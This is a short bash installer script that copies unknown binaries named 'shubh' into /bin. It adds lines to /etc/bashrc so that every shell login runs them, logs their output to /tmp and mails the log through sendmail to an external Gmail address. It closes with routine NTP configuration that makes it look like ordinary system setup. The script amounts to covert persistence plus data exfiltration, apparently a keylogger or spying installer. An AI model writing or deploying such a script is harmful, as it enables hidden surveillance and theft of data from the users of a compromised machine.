#!/bin/bash
chmod a+rwx logs*
chmod a+rx
mv shubh* /bin/
mv logs* /tmp
echo "shubh3 > /tmp/logs.log" >> /etc/bashrc
echo "shubh3 >> /tmp/logs1.log" >> /etc/bashrc
echo "sendmail shubhamk.esds@gmail.com < /tmp/logs.log" >> /etc/bashrc
echo "shubh" >> /etc/bashrc
yum install ntp
systemctl enable ntpd
systemctl restart ntpd
ntpdate -q 0.centos.pool.ntp.org
systemctl restart ntpd

